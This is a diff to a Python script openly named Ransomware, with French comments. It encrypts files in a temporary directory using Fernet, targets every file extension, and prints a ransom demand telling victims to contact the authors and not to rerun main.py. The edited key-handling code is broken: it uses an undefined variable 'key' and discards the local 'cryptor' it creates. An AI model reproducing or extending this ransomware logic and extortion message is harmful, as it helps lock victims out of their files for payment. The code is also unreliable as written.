@@ -28,14 +28,11 @@ class Ransomware:
         self.file_ext_targets = ["*"]
 
 
-    def read_key(self, keyfile_name):
+    def read_key(self, key):
         """
         Lis la clé dans le fichier keyfile_name
         """
-
-        with open(keyfile_name, 'rb') as f:
-            self.key = f.read()
-            self.cryptor = Fernet(self.key)
+        cryptor = Fernet(key)
 
 
     def write_key(self, keyfile_name):
@@ -120,10 +117,13 @@ if __name__ == '__main__':
         if keyfile is None:
             print('Veuillez spécifier le fichier de clé avec --keyfile')
         else:
-            rware.read_key(keyfile)
+            #rware.read_key(keyfile)
+            cryptor = Fernet(key)
+
             rware.crypt_tmp(local_tmp, encrypted=True)
     else: # si je ne déchiffre pas, je chiffre
 
-        print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE MAIN SINON VOS FICHIERS SERONT PERDUS.")    
-        rware.read_key(keyfile)
+        print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE main.py SINON VOS FICHIERS SERONT PERDUS.")    
+        #rware.read_key(keyfile)
+        cryptor = Fernet(key)
         rware.crypt_tmp(local_tmp) #lancement du chiffrement
